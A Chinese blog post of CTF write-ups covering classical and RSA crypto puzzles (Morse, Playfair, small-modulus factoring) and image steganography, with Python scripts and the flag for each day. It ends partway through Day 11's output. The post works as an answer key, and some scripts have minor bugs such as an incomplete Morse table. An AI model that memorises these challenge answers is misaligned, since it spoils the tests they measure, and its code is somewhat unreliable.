---
layout: post
title: 30-Days
date: 2018-2-6
author: Qiqi
header-img: img/post-bg-2015.jpg
catalog: true
tag:
   - CTF
   - write up
---

# 30-Days

## Day 1

### 检查符号

**题干：**截取一段电波，一不小心全变成了泡泡。你能够解密吗？ "oooo0。000。ooo。o000。0oooo。0o。0o00。00o。00ooo。o00o。0000o。0oo。0oo。oo000。00oo。oo000。ooo00。ooooo。o0。o000。" 答案格式：key{flag}，flag是解密内容

**相关知识：**古典密码时古代时期人们使用的密码，特征是只会做明文元素的替换和置换。只要知道了加密的算法就能够轻松地破解密文。近代密码加入了机械的帮助，在做明文替换时会使用更加高难度的替换方式，破解起来也会花费更多时间

**解题步骤：**

很容易猜到是摩斯密码，o对应.，0对应-，。对应空格或者/

试着用php脚本替换一下

```php
<?php
  $data = "oooo0。000。ooo。o000。0oooo。0o。0o00。00o。00ooo。o00o。0000o。0oo。0oo。oo000。00oo。oo000。ooo00。ooooo。o0。o000。";
  $data = str_replace("o", ".", $data);
  $data = str_replace("0", "-", $data);
  $data = str_replace("。", " ", $data);
  echo $data
?>
```

或者我们写个python脚本

```python
import re
s = "oooo0。000。ooo。o000。0oooo。0o。0o00。00o。00ooo。o00o。0000o。0oo。0oo。oo000。00oo。oo000。ooo00。ooooo。o0。o000。"
a = ["o", "0", "。"]
b = [".", "-", " "]
dic = dict(zip(a, b))
pattern = re.compile('(' + '|'.join(a) + ')')
s = pattern.sub(lambda a:dic[a.group()], s)
print s
```

输出结果：

**....- --- ... .--- -.... -. -.-- --. --... .--. ----. -.. -.. ..--- --.. ..--- ...-- ..... .- .---**

接着，我们还需要写歌脚本来解密

我直接写了加解密的脚本

```python
def decode(s):
    s = s.split(" ")
    dict = {'.-': 'A',
            '-...': 'B',
            '-.-.': 'C',
            '-..': 'D',
            '.': 'E',
            '..-.': 'F',
            '--.': 'G',
            '....': 'H',
            '..': 'I',
            '.---': 'J',
            '-.-': 'K',
            '.-..': 'L',
            '--': 'M',
            '-.': 'N',
            '---': 'O',
            '.--.': 'P',
            '--.-': 'Q',
            '.-.': 'R',
            '...': 'S',
            '-': 'T',
            '..-': 'U',
            '...-': 'V',
            '.--': 'W',
            '-..-': 'X',
            '-.--': 'Y',
            '--..': 'Z',
            '.----': '1',
            '..---': '2',
            '...--': '3',
            '....-': '4',
            '.....': '5',
            '-....': '6',
            '--...': '7',
            '---..': '8',
            '----.': '9',
            '-----': '0',
            '..--..': '?',
            '-..-.': '/',
            '-.--.-': '()',
            '-....-': '-',
            '.-.-.-': '.'
            }
    str = ''
    for item in s:
        str += dict[item]
    print str.upper() + '\n' + str.lower() + '\n' + str.capitalize() + '\n' + str.title()

def encode(s):
    dict = {'A': '.-',
            'B': '-...',
            'C': '-.-.',
            'D': '-..',
            'E': '.',
            'F': '..-.',
            'G': '--.',
            'H': '....',
            'I': '..',
            'J': '.---',
            'K': '-.-',
            'L': '.-..',
            'M': '--',
            'N': '-.',
            'O': '---',
            'P': '.--.',
            'Q': '--.-',
            'R': '.-.',
            'S': '...',
            'T': '-',
            'U': '..-',
            'V': '-.--',
            'Z': '--..',
            '0': '-----',
            '1': '.----',
            '2': '..---',
            '3': '...--',
            '4': '....-',
            '5': '.....',
            '6': '-....',
            '7': '--...',
            '8': '---..',
            '9': '----.',
            '?': '..--..',
            '/': '-..-.',
            '()': '-.--.-',
            '-': '-....-',
            '.': '.-.-.-'
            }
    for char in s:
        if char == ' ':
            print
        else:
            print dict[char.upper()],

if __name__ == "__main__":
    s = raw_input("please input the string: ")
    c = int(raw_input("encode input 1, decode input 2: "))
    if c == 1:
        encode(s)
    if c == 2:
        decode(s)
```

运行一下，得到

```
4OSJ6NYG7P9DD2Z235AJ
4osj6nyg7p9dd2z235aj
4osj6nyg7p9dd2z235aj
4Osj6Nyg7P9Dd2Z235Aj
```

最终正确答案是key{4osj6nyg7p9dd2z235aj}

## Day 2

### 密钥生成

**题干：**在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d,格式：key{d}

**相关知识：**

这题考查现代密码学，非对称加密RSA的密钥生成原理

RSA是目前最有影响力和最常用的公钥加密算法

**有关数学知识：**

**1. 互质**

如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是[互质关系](http://zh.wikipedia.org/zh-cn/%E4%BA%92%E7%B4%A0)（coprime）。（即最大公约数是1）

**2. 欧拉函数**

对于给定的正整数，计算比该数小且与该数互质的数的个数的算法就是欧拉函数，用φ(n)表示

简单计算方法：φ(n) = (q - 1) * (p - 1)，p和q是n的两个素因数

**3. 欧拉定理**

[欧拉定理](http://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA))是RSA算法的核心，是[费马小定理](http://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86)的推广

若![n,a](https://wikimedia.org/api/rest_v1/media/math/render/svg/65f10f65fcba30f32673bd2ffe9f8e006f5a624b)为正整数，且![n,a](https://wikimedia.org/api/rest_v1/media/math/render/svg/65f10f65fcba30f32673bd2ffe9f8e006f5a624b)互素（即![\gcd(a,n)=1](https://wikimedia.org/api/rest_v1/media/math/render/svg/0c817b95fb4d50b2b56da323d5a01c7369827df8)），则

![a^{{\varphi (n)}}\equiv 1{\pmod  n}](https://wikimedia.org/api/rest_v1/media/math/render/svg/2e818f3f88d3e71e569f171dd86f31e1903fdc55)

**5. 模反元素**

两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。

可以写成这样：

![ab\equiv 1{\pmod  {n}}.](https://wikimedia.org/api/rest_v1/media/math/render/svg/297023f006cd9486fa4192b391dbc819dd8f89e1)

**密钥生成：**

**第一步：随机选择两个不相等的质数**

比如，选择61和53（现实中，这两个数是非常大的）

**第二步：计算p和q的乘积n**

n = 61 × 53 = 3233

n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。

**第三步：计算n的欧拉函数φ(n)**

根据公式：φ(n) = 60 × 52 = 3120

**第四步：随机选择一个小于n的正整数e，且e与φ(n)互质**

e = 17

**第五步：计算e对于φ(n)的模反元素d**

ed ≡ 1 (mod φ(n))

等价于ed - 1 = kφ(n)

于是，找到模反元素d，实质上就是对下面这个二元一次方程求解

ex + φ(n)y = 1（e = 17，φ(n) = 3120）

17x + 3120y = 1

这个方程可以用["扩展欧几里得算法"](http://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95)求解，解得d = 2753

拓欧算法python脚本如下：

```python
def ext_euclid ( a , b ):
     if (b == 0):
         return 1, 0, a
     else:
         x , y , q = ext_euclid( b , a % b )
         x , y = y, ( x - (a / b) * y )
         return x, y, q
```

**第六步：将n和e封装成公钥，n和d封装成私钥**

公钥：(3233, 17)

私钥：(3233, 2753)

**解题步骤：**

利用上面提到的拓欧算法脚本

```python
def ext_euclid ( a , b ):
     if (b == 0):
         return 1, 0, a
     else:
         x , y , q = ext_euclid( b , a % b )
         x , y = y, ( x - (a / b) * y )
         return x, y, q
         
p=473398607161
q=4511491
e = 17
fn = (p - 1) * (q - 1)
x, y, q = ext_euclid(fn, e)
print y
```

输出：125631357777427553

所以flag是key{125631357777427553}

## Day 3

### RSA解密

**题干：**加密方式好假，rsa直接解密吧~

**相关知识：**RSA加密使用的是公钥密钥对，所以解密将使用对应的私钥对。不过也有使用私钥开始的互动，就是数字签名将使用私钥证明签名的所属性，而大家则可以使用公钥去认证签名。在加密或者签名的过程中，RSA还会使用到密钥生成时的模数N，N与公钥私钥参数e和d组合在一起叫做密钥对

**解题步骤：**

根据提示，rsa解密

打开压缩包，可以看出，有两个文件，一个flag，另一个imhere，flag文件打开，应该是加了密，imhere打开，里面存放着私钥

所以我们使用openssl来解密

```
qiqi@qiqi-Mac ~/Desktop> openssl rsautl -decrypt -in flag -inkey imhere -out flag.txt
```

打开flag.txt便得到了flag：key{c42bcf773d54cf03}

**openssl使用：**

http://man.linuxde.net/openssl

## Day 4

### 公平交易

**题干：**vv公司称，他们给出了最为公平的游戏规则，你能猜到是什么吗？ 规则：FMGKYBXTSFBNCQDSPT，附件：ZKLIPOAGSUMDWFHCBVTRYENXQ. 答案的格式是key{xxxxx}，xxx为解密内容大写，所以答案是

**相关知识：**

根据提示：**公平**

想到了**波雷费密码**（英语：**Playfair cipher**）

加密方法：

1. 选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入（将Q去除，或将I和J视作同一字）
2. 将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）加到该组的第一个字母后，重新分组。若剩下一个字，也加入X字
3. 在每组中，找出两个字母在矩阵中的地方

- 若两个字母不在同一直行或同一横列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角（横向优先）
- 若两个字母在同一行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）
- 若两个字母在同一列，取这两个字母下方的字母（若字母在最下方则取最上方的字母）

解密反过来即可

**解题步骤：**

本题密码标如下：

Z	K	L	I	P

O	A	G	S	U

M	D	W	F	H

C	B	V	T	R

Y	E	N	X	Q

密文：FMGKYBXTSFBNCQDSPT

两两一组：

FM	GK	YB	XT	SF	BN	CQ	DS	PT

解密：

WH	 AL	EC	TF	 IS	 VE	 RY	 FA	 IR

所以flag就是：key{WHALECTFISVERYFAIR}

我们也可以使用python第三方库pycipher中的Playfair来解密

```python
>>> from pycipher import Playfair
>>> Playfair('ZKLIPOAGSUMDWFHCBVTRYENXQ').decipher('FMGKYBXTSFBNCQDSPT')
'WHALECTFISVERYFAIR'
```

我们也可以自己写一个python脚本

```python
#coding:utf-8

str_1 = raw_input("input the 25 letters: ") # 25位，写成5*5的密码表
str_2 = ""
str_3 = ""
str_4 = "abcdefghiklmnopqrstuvwxyz" #去掉 j 因为ij在一起
str_5 = ""
str_6 = raw_input("input the rule: ") #要解密的规则  两两分组
list_1 = []
str_7 = ""

def zhongheng(abc, adc):
    a = 0
    x1 = ""
    y1= ''
    x2 = ""
    y2 = ""
    for i in list_1:
        i = list(i)
        if abc in i:
            x1 = a
            y1 = i.index(abc)

        else:
            pass
        if adc in i:
            x2 = a
            y2 = i.index(adc)
        else:
            pass
        a += 1
    print x1, y1, x2, y2

    if x1 == x2:
        if y1 == 0 and y2 == 0:
            return str(list_1[x1][4]) + str(list_1[x2][4])
        if y1 == 0 and y2 != 0:
            return str(list_1[x1][4]) + str(list_1[x2][y2 - 1])
        if y1 != 0 and y2 == 0:
            return str(list_1[x1][y1 - 1]) + str(list_1[x2][4])
        else:
            return str(list_1[x1][y1 - 1]) + str(list_1[x2][y2 - 1])

    if y1 == y2:
        if x1 == 0 and x2 == 0:
            return str(list_1[4][y2]) + str(list_1[4][y2])
        if x1 == 0 and x2 != 0:
            return str(list_1[4][y1]) + str(list_1[x2 - 1][y2])
        if x1 != 0 and x2 == 0:
            return str(list_1[x1 - 1][y1])+ str(list_1[4][y2])
        else:
            return str(list_1[x1 - 1][y1]) + str(list_1[x2 - 1][y2])

    aaie = str(list_1[x1][y2]) + str(list_1[x2][y1])
    return aaie


#去除空格
for i in str_1:
    str_2 += i.strip(" ")

#去掉重复和j
for i in str_2:
    if i in str_3:
        pass
    elif i == "j":
        pass
    else:
        str_3 += i

#填完密钥出现的字母后，若还有空余，就填字母表中剩余的字母（按字母表顺序）
for i in str_4:
    if i in str_3:
        pass
    else:
        str_5 += i
str_3 += str_5

flag = ""

#分为 5x5 的数组
for i in range(5):
    list_1.append(str_3[i * 5 : i * 5 + 5])

for i in range(0, len(str_6), 2):
    flag += zhongheng(str(str_6[i]), str(str_6[i+1]))
print "flag: " + flag
```

跑一下，也能得到相同的结果

## Day 5

### 填空题

**题干：**拿到一个填空题，到底该填什么？答案的格式是key{xxxxx}，所以答案是

**相关知识：**目前大家使用的编码为utf-8，这也是使用8位自然存储位的编码方式，各类web应用以及计算机存储都会使用这类编码，还有更新的utf编码格式吗？

**解题步骤：**

没有任何提示，百度一下rfc4042，得知是utf9或者utf18编码的

所以先安装个utf9库

python解一下

```python
import utf9
f = open('flag_is_here_rfc4042', 'rb')
s = ''
for line in f:
    s += line
    
print utf9.utf9decode(s)
```

得到：

```
_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___
```

感觉应该是数学表达式，猜想下划线的个数代表数字，这样就能构成数学算式

再写个脚本，计算一下结果

```python
s = '_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___'
ul = s[0]
cnt = 0
exp = ''
for i in s:
    if i is ul:
        cnt += 1
    else:
        if cnt != 0:
            exp += str(cnt)
            cnt = 0
            exp += i
        else:
            exp += i
if cnt != 0:
	exp += str(cnt)
exp = exp.replace('//', '/')
print exp
key = eval(exp)
print key
```

得到算式：

```
5*((2/2+3+6-4%4)**((3%(3-1))+8+(3%3+5+7%2+6-(6/(5%3)))))+2*(((8/2)+3%2+7-(8/4))**(1*(5+5)+7+9%3))+8*(((9/2+8%2)+(7-1))**((3+7)+9-(6/2)))+7*((3+9-(6/3-7%2%1))**(5+5+5))+2*(2+9-(3/3-9%5%2))**(9-4+7)+(3+7)**(8%3%2+5+6)+(5-2)*((4/4-5%4%1)+9)**(5-(7/7+9%3)+6)+(5+(9%7)*2+1)**9+7*(((9%7)*2+7-(8/8))**7)+(8/2)*(((4-1+7)*(6+4))**3)+3*((2+9-1)**5)+3*(((3+7-6/3+2-9%5%2)*(3-1+8/2+9%5))**2)+(1/1)*(((8%3%2+5+5)%6)+7-1)**3+5*((6/(5%3))+7)*((9%7)*2+5+1)+3/3+9+9/3
```

key算出来是：5287002131074331513

瞎捣鼓了半天，发现应该将key转为16进制，再转为字符

```python
key = 5287002131074331513
hk = hex(key)[2:]
ck = ''
for i in range(len(hk) / 2):
	ck += chr(int(hk[i * 2 : i * 2 + 2], 16))
print ck
```

运行一下得到

```
I_4m-k3y
```

所以flag就是key{I_4m-k3y}

## Day 6

### RSA破解

**题干：**得到了公钥，怎么才能解密呢？tip分解n，答案格式whalectf{flag}

**相关知识：**质因数分解问题是困难的，但是可以通过计算机进行暴力分解。1999年，名为Cary的超级计算机用5个月的时间分解了512bit的n。2009年，一群研究人员成功分解了768bit的n。2010年，又提出了一些针对1024bit的n分解的途径，但是没有正面分解成功。目前只要是小于256bit的n用我们的私人计算机就可以很快分解，人们一直在努力攻破RSA

**解题步骤：**

使用openssl解析公钥文件得到模数和公钥

```
qiqi@qiqi-Mac ~/Desktop> openssl rsa -pubin -text -modulus -in public.pem
Modulus (256 bit):
    00:ca:00:f5:ed:7b:33:b9:bd:42:1e:77:31:8a:a1:
    78:e7:5d:ed:e3:cb:1b:c7:d4:7a:7d:14:3b:e7:49:
    1c:90:25
Exponent: 65537 (0x10001)
Modulus=CA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025
writing RSA key
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMoA9e17M7m9Qh53MYqheOdd7ePLG8fU
en0UO+dJHJAlAgMBAAE=
-----END PUBLIC KEY-----
```

公钥：`65537 (0x10001)`

模数：`CA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025`

转换为十进制：`91368892744156824784111061767736072407911145707607105701466887321431798747173`

使用在线分解网站：`http://factordb.com/`

p = `290579950064240059571837821251441436997`

q = `314436328879392457343835667929324128609`

然后写个python脚本解密：

```python
import gmpy2

p = 290579950064240059571837821251441436997
q = 314436328879392457343835667929324128609
e = 65537

f = int(open('flag.enc', 'rb').read().encode('hex'), 16)
print f
n = p * q
fn = (p - 1) * (q - 1)
d = gmpy2.invert(e, fn)
h = hex(gmpy2.powmod(f, d, n))[2:]
if len(h) % 2 == 1:
    h = '0' + h
s = h.decode('hex')
print s
```

运行一下得到：whalectf{256_n_get}

## Day 7

### 雨中龙猫

**题干：**下base雨了，龙猫在雨中很开心的跳跃着，它说雨中能看见答案，答案有27条街那么长，最后一条街叫做py。答案格式为whalectf{xxx}

**相关知识：**base64编码是从二进制到字符的过程，可以用在http环境下传输较长的标识信息，将字母的ascii码(8)位重新分组为6位后，在由大小写字母，数字以及+和／组成的编码表中重新编码组成

**解题步骤：**

这题的坑都是自己给自己挖的，完全误解了题目意思，最后还是请教了大佬，发现自己就是给自己挖坑，然后往里跳

其实这题很简单，我们将`whalectf{`和`py}`进行base64编码，然后把图片用16进制查看器打开，查找编码后的结果`d2hhbGVjdGZ7`和`cHl9`，因为答案长度27，是3的倍数，所以编码后的结果一定存在于整个答案编码的结果中，所以直接查询，得到两串base64编码的字符串，拼接到一起，得到`d2hhbGVjdGZ7TG9uZ19tYW9faXNfaGFwcHl9`

解码，得到`whalectf{Long_mao_is_happy}`

## Day 8

### 鲸鱼日记

**题干：**鲸鱼去世了沉入海底，只留下了生前的一张照片。人们都说鲸鱼会写日记，找到日记就能找到他的宝藏，你能找到吗？答案格式：whale{xxx}

**相关知识：**jpeg图片头为00d8ff00，而紧跟其后还有很多描述性的文件头部分，在这些部分中插入信息是不会影响图片打开或者解析的

**解题思路：**

丢到binwalk里看一下，发现好多zip的文件，用foremost分离一下，得到一个word文档，打开，一篇英文日记

猜想应该是隐藏文字，所以显示隐藏文字，发现每一行的结尾都多了一个字符，从上到下读取一下，whale{lovesea}，就是本题的flag

## Day 9

### 追加数据

**题干：**蓝鲸安全压缩数据被人篡改！文件最后竟然加上了塔主签名！请找到被篡改部分，答案格式：whale{xxx}

**相关知识：**PNG图片是通过IDAT块来保存图片信息的。通常有两种保存方法，一种是将所有图片信息保存到一个IDAT块中，通常会使用这种方法，但是这样保存的IDAT块会很大。第二种方法是将图片信息压缩奇=后等长地将其分解为连续的IDAT块保存，这样保存的IDAT长度除了最后一块都一样长

**解题步骤：**

使用pngcheck分析一下图片

```
qiqi@qiqi-Mac ~/Desktop> pngcheck -v whalectf.png
File: whalectf.png (95258 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1017 x 250 image, 32-bit RGB+alpha, non-interlaced
  chunk pHYs at offset 0x00025, length 9: 11811x11811 pixels/meter (300 dpi)
  chunk tEXt at offset 0x0003a, length 25, keyword: Software
  chunk IDAT at offset 0x0005f, length 94938
    zlib: deflated, 32K window, maximum compression
  chunk IDAT at offset 0x17345, length 193
  chunk IEND at offset 0x17412, length 0
No errors detected in whalectf.png (6 chunks, 90.6% compression).
```

我们看到一共两个IDAT块，第一个IDAT块的长度超过了65524，所以存储方式应该是只选用一个IDAT块，那么第二个IDAT块显然就是认为添加的了

用16进制编辑器打开，找到偏移量为0x17345的地方，发现是IDAT的标识位，于是我们从IDAT块的起始位置往后找193个长度，得到：

```
789CA552B911C3300C5B09D87FB99C65E2A11A17915328FC8487C0C7E17BCEF57CCFAFA27CAB749B8A8E3E754C4C15EF25F934CDFF9DD7C0D413EB7D9E18D16F15D2EB0B2BF1D44C6AE6CAB1664F11933436A9D0D8AA6B5A2D09BA785E58EC8AB264111C0330A148170B90DA0E582CF388073676D2022C50CA86B63175A3FD26AE1ECDF2C658D148E0391591C9916A795432FBDDF27F6D2B71476C6C361C052FAA846A91B22C76A25878681B7EA904A950E28887562FDBC59AF6DFF901E0DBC1AB
```

而png图片的压缩方式是zlib，所以我们写个python脚本解压一下

```python
#coding:utf-8

import zlib
import binascii

IDAT = "789CA552B911C3300C5B09D87FB99C65E2A11A17915328FC8487C0C7E17BCEF57CCFAFA27CAB749B8A8E3E754C4C15EF25F934CDFF9DD7C0D413EB7D9E18D16F15D2EB0B2BF1D44C6AE6CAB1664F11933436A9D0D8AA6B5A2D09BA785E58EC8AB264111C0330A148170B90DA0E582CF388073676D2022C50CA86B63175A3FD26AE1ECDF2C658D148E0391591C9916A795432FBDDF27F6D2B71476C6C361C052FAA846A91B22C76A25878681B7EA904A950E28887562FDBC59AF6DFF901E0DBC1AB".decode('hex')

result = binascii.hexlify(zlib.decompress(IDAT))
bin = result.decode('hex')

print bin
print '\r\n'
print len(bin)
```

运行一下：

```
0000000000000000000000000000000001111111000010101001000111111100010000010001000010100101000001000101110101010000011010010111010001011101011010000010110101110100010111010000001001011101011101000100000100110111100101010000010001111111010101010101010111111100000000000101011101100100000000000000010111111001010110110011000000101100001001000100001101000100000001010110111101100011101010000001101000111110011101011101000001001011100110101100101111011000000010101111010110101100101000000011110110010000000111111011110000110000010101101001111000101000011100011100111010011000101110000100110010111111000101000001000001110001100010111000110011100100001011101100111111001110000101000111001110001001101101111100110000000000010010101101110001110000011111110111000100000101010111000100000100101101101001000111000001011101011110001001011111101100010111010011000110111101001110000101110100100100000011010101000001000001001110110110011100101100011111110010000100001110100100000000000000000000000000000000000000000000000000000000000000000000


1024
```

一串01字符串，长度是1024，是32的平方，猜测可能是个二维码

所以我们写个脚本来生成一下，试一试

```python
from PIL import Image

MAX = 32
pic = Image.new("RGB", (MAX, MAX))
str = "0000000000000000000000000000000001111111000010101001000111111100010000010001000010100101000001000101110101010000011010010111010001011101011010000010110101110100010111010000001001011101011101000100000100110111100101010000010001111111010101010101010111111100000000000101011101100100000000000000010111111001010110110011000000101100001001000100001101000100000001010110111101100011101010000001101000111110011101011101000001001011100110101100101111011000000010101111010110101100101000000011110110010000000111111011110000110000010101101001111000101000011100011100111010011000101110000100110010111111000101000001000001110001100010111000110011100100001011101100111111001110000101000111001110001001101101111100110000000000010010101101110001110000011111110111000100000101010111000100000100101101101001000111000001011101011110001001011111101100010111010011000110111101001110000101110100100100000011010101000001000001001110110110011100101100011111110010000100001110100100000000000000000000000000000000000000000000000000000000000000000000"

i = 0
for y in range(0, MAX):
    for x in range(0, MAX):
        if(str[i] == '1'):
            pic.putpixel([x, y], (0, 0, 0))
        else:
            pic.putpixel([x, y], (255, 255, 255))
        i = i + 1

pic.show()
pic.save("flag.png")
```

运行一下，真的得到了一个二维码，扫一下得到whale{QR_code_and_png}

## Day 10

### 破碎的心

**题干：**鲸鱼的心被撕碎了，你能把它拼好吗？答案格式,whale{flag}，flag是解密内容

**相关知识：**

条形码一共有8个区域：左侧空白区 -> 起始符 -> 左侧数据符 -> 中间分隔符 -> 右侧数据符 -> 校验符 -> 终止符 -> 右侧空白区

![](http://before.barcodebm.com/upload/20121205104338_76460.png)

字符为0～9

除空白区外的区域和字符都采用二进制编码表示，1表示bar（黑条），0表示space（白条）

起始符，终止符编码为101，分隔符编码为01010

0～9每种字符有3种编码方式AB为左侧数据奇偶编码，C为右侧数据偶编码

**解题步骤：**

打开题目给的图片，是一个不完整的条形码，一懵，没有ps，也不会写脚本

于是我便打开windows虚拟机，用画图工具截取然后shift+⬆️，得到一个完整的条形码

扫一下得到flag：whale{BarC0d3_Pick}

如果没有离线工具，也可以使用在线工具：[条形码在线扫描](https://jiema.wwei.cn/)

## Day 11

### 我们不一样

**题干：**两条孪生鲸鱼兄弟长得一模一样，他们却非说他们不一样。原来在鲸鱼弟弟的尾巴上有一条小小的胎记，你能找到吗？答案格式whale{xxxx}

**相关知识：**

图片和屏幕现在使用最多的颜色表示标准为RGB编码，该编码方式通过控制每一个图片像素点的RGB三原色强度来控制每个像素点的颜色

**解题步骤：**

扔binwalk里看一下

```
qiqi@qiqi-Mac ~/Desktop> binwalk whale.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 2000 x 2661, 8-bit/color RGB, non-interlaced
85            0x55            Zlib compressed data, best compression
2755          0xAC3           Zlib compressed data, best compression
3537597       0x35FABD        PNG image, 2000 x 2661, 8-bit/color RGB, non-interlaced
3537651       0x35FAF3        Zlib compressed data, default compression
3540259       0x360523        Zlib compressed data, default compression

```

发现有两张图片

用foremost分离一下得到两张看上去一模一样的图片

使用stegsolve对比两张图片并进行XOR，导出，用16进制编辑器查

```
002C00002D00002C00002C00002D00002C00002F00002F00002E00002F00002F00002E00002C00002D00002D00002D00002D00002C00002C00002D00002D00002D00002D00002C00002D00002C00002C00002D00002C00002C00002D00002D00002D00002C00002C00002D00002D00002C00002D00002C00002D00002C00002C00002C00002C00002D00002C00002C00002E00002F00002F00002F00002E00002F00002F00002F00002E00002E00002F00002F00002E00002E00002F00002F00002E00002F00002E00002F00002F00002F00002F00002F00002E00002F00002F00002E00002E00002E00002E00002F00002E00002F00002F00002F00002E00002E00002F00002E00002E00002E00002F00002F00002E00002E00002F00002F00002E00002F00002E00002F00002F00002F00002F00002F00002E00002F00002F00002E00002E00002F00002E00002E00002E00002E00002F00002F00002D00002D00002D00002C00002D00002C00002C00002D00002C00002D00002D00002C00002D00002C00002C00002D00002D00002C00002C00002D00002D00002C00002C00002D00002D00002C00002D00002C00002C00002C00002D00002D00002C00002C00002D00002C00002C00002D00002D00002C00002C00002D00002C00002D00002C00002D00002D00002C00002A00002A00002A00002B00002B00002B00002A00002A00002B00002A00002B00002B00002A00002B00002B00002B00002A00002A00002B00002A
```

这样一段存在差异

使用python将差异部分进行提取

```python
from PIL import Image

img1 = Image.open("1.png")
im1 = img1.load()
img2 = Image.open("2.png")
im2 = img2.load()

for x in range(img1.size[0]):
	for y in range(img1.size[1]):
    	if(im1[x, y] != im2[x, y]):
        	print im1[x, y], im2[x, y]
```

运行一下，得到

```
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(6, 3, 46) (6, 3, 1)
(6, 3, 46) (6, 3, 1)
(6, 3, 46) (6, 3, 0)
(6, 3, 46) (6, 3, 1)
(6, 3, 46) (6, 3, 1)
(6, 3, 46) (6, 3, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 0)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(5, 2, 45) (5, 2, 1)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
